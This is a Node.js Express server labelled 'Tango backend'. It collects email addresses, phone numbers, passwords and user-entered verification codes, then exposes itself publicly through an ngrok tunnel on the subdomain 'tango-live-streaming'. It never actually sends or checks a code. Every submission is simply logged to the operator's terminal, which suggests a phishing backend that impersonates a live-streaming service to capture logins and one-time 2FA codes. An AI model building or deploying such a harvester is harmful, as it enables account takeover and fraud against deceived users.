const express = require('express');
const multer = require('multer');
const cors = require('cors');
let ngrok;
try {
  ngrok = require('ngrok');
} catch (e) {
  // ngrok may not be installed in the target repo. We'll handle this later.
  ngrok = null;
}
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;
const ENABLE_NGROK = (process.env.ENABLE_NGROK || 'true').toLowerCase() !== 'false' && (process.env.DISABLE_NGROK || 'false').toLowerCase() !== 'true';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Routes
app.post('/api/send-verification', (req, res) => {
  try {
    console.log('\n=== NEW VERIFICATION REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    
    const { email, phone, type } = req.body;
    
    // Print verification data
    console.log('Verification Data:');
    console.log('- Type:', type);
    console.log('- Email:', email || 'Not provided');
    console.log('- Phone:', phone || 'Not provided');
    console.log('- Status: Verification page shown to user');
    console.log('- Action: Waiting for user to enter verification code...');
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Verification page displayed successfully',
      data: {
        email: email,
        phone: phone,
        type: type
      }
    });
    
  } catch (error) {
    console.error('Error processing verification request:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing verification request',
      error: error.message
    });
  }
});

// New endpoint to handle verification code submission
app.post('/api/verify-code', (req, res) => {
  try {
    console.log('\n=== VERIFICATION CODE SUBMITTED ===');
    console.log('Timestamp:', new Date().toISOString());
    
    const { email, phone, type, verificationCode } = req.body;
    
    // Print verification code data
    console.log('Verification Code Data:');
    console.log('- Type:', type);
    console.log('- Email:', email || 'Not provided');
    console.log('- Phone:', phone || 'Not provided');
    console.log('- Verification Code Entered:', verificationCode);
    console.log('- Status: Code received and logged');
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Verification code received and logged',
      data: {
        email: email,
        phone: phone,
        type: type,
        verificationCode: verificationCode
      }
    });
    
  } catch (error) {
    console.error('Error processing verification code:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing verification code',
      error: error.message
    });
  }
});

// Keep the old upload endpoint for backward compatibility
app.post('/api/upload', upload.single('image'), (req, res) => {
  try {
    console.log('\n=== NEW UPLOAD REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    
    // Print all form data
    console.log('Form Data:');
    console.log('- Email:', req.body.email || 'Not provided');
    console.log('- Password:', req.body.password ? '***' + req.body.password.slice(-3) : 'Not provided');
    console.log('- Phone:', req.body.phone || 'Not provided');
    
    // Print file information
    if (req.file) {
      console.log('File Information:');
      console.log('- Original Name:', req.file.originalname);
      console.log('- Filename:', req.file.filename);
      console.log('- Mimetype:', req.file.mimetype);
      console.log('- Size:', (req.file.size / 1024).toFixed(2) + ' KB');
      console.log('- Path:', req.file.path);
    } else {
      console.log('File: No file uploaded');
    }
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Data received successfully',
      data: {
        email: req.body.email,
        phone: req.body.phone,
        hasImage: !!req.file,
        imagePath: req.file ? req.file.filename : null
      }
    });
    
  } catch (error) {
    console.error('Error processing upload:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing upload',
      error: error.message
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve uploaded images
app.use('/uploads', express.static(uploadsDir));

// If a frontend build exists in one of a few common locations, serve it as the root.
// This helps portability when the server file is moved into a repo with a different layout.
const possibleDistPaths = [
  path.join(__dirname, '..', 'dist'),            // original layout: repo/server -> repo/dist
  path.join(process.cwd(), 'dist'),              // repo root dist
  path.join(__dirname, 'dist'),                  // server/dist
];
let frontendDist = null;
for (const p of possibleDistPaths) {
  if (fs.existsSync(p)) {
    frontendDist = p;
    break;
  }
}

if (frontendDist) {
  console.log('Frontend build found, serving static files from', frontendDist);
  app.use(express.static(frontendDist));

  // Fallback to index.html for client-side routing (but allow API/uploads)
  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/api') || req.path.startsWith('/uploads')) return next();
    res.sendFile(path.join(frontendDist, 'index.html'));
  });
} else {
  app.get('/', (req, res) => {
    res.send(`
      <html>
        <head><title>Tango Backend</title></head>
        <body>
          <h1>Tango backend</h1>
          <p>Server is running on port ${PORT}. Check <a href="/api/health">/api/health</a> for status.</p>
          <p>To serve a frontend from this server, place your built files in a <code>dist</code> folder at the repo root or alongside the server folder.</p>
        </body>
      </html>
    `);
  });
}

// Start server
app.listen(PORT, async () => {
  console.log(`Server running on http://localhost:${PORT}`);

  if (!ENABLE_NGROK) {
    console.log('Ngrok auto-start disabled via environment (ENABLE_NGROK=false or DISABLE_NGROK=true).');
    return;
  }

  if (!ngrok) {
    console.log('Ngrok module is not installed in this repository. Skipping tunnel creation.');
    console.log('You can run a tunnel manually: npx ngrok http ' + PORT);
    return;
  }

  try {
    let url;
    try {
      url = await ngrok.connect({ addr: PORT, subdomain: 'tango-live-streaming' });
    } catch (subdomainError) {
      console.log('Subdomain failed, trying without subdomain...');
      try {
        url = await ngrok.connect({ addr: PORT });
      } catch (err2) {
        // If the returned value is an object instead of a string, log it for debugging
        console.error('ngrok.connect failed:', err2 && err2.message ? err2.message : err2);
        url = null;
      }
    }

    if (typeof url === 'string' && url.length > 0) {
      console.log(`\n🌐 Ngrok tunnel active:`);
      console.log(`Public URL: ${url}`);
      console.log(`Local URL: http://localhost:${PORT}`);
      console.log(`\n📊 All form submissions will be logged to this terminal\n`);
    } else {
      console.log('Ngrok did not return a public URL. If you need a tunnel, run: npx ngrok http ' + PORT);
    }

  } catch (error) {
    // Defensive: ngrok library versions or network issues can produce different shapes of errors
    console.error('Failed to start ngrok. Error details:', error && error.stack ? error.stack : error);
    console.log('\n🔧 Ngrok troubleshooting:');
    console.log('1. Make sure you have an ngrok account: https://ngrok.com/');
    console.log('2. Get your authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken');
    console.log('3. Run: npx ngrok config add-authtoken YOUR_TOKEN');
    console.log('4. Or run manually: npx ngrok http ' + PORT);
    console.log('5. Check if ngrok is installed: npx ngrok version');
    console.log('\nServer is running locally at http://localhost:' + PORT);
  }
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('\nShutting down server...');
  await ngrok.kill();
  process.exit(0);
});
